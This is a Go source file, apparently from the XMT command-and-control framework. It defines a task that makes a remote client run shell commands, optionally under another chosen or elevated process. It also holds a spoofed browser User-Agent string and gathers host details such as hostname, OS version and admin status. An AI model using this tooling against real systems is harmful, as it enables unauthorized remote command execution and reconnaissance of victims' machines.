//go:build !crypt

package task

import "github.com/iDigitalFlame/xmt/device/local"

const (
	pwsh      = "-comm"
	execA     = "*.so"
	execB     = "*.dll"
	execC     = "*.exe"
	userAgent = "User-Agent"
	userValue = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
)

// Shell will create a Task that will instruct the client to run a shell
// command. The command will be passed as an argument to the default shell
// found on the device.
//
// The Filter attribute will attempt to set the target that runs the Process.
// If none are specified, the Process will be ran under the client process.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr
// data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
func Shell(c string) Process {
	return Process{Args: []string{"@SHELL@", c}, Wait: true}
}
func createEnvironment() map[string]interface{} {
	return map[string]interface{}{
		"ID":       local.UUID.String(),
		"PID":      local.Device.PID,
		"PPID":     local.Device.PPID,
		"OSVER":    local.Version,
		"ADMIN":    local.Elevated(),
		"HOSTNAME": local.Device.Hostname,
	}
}
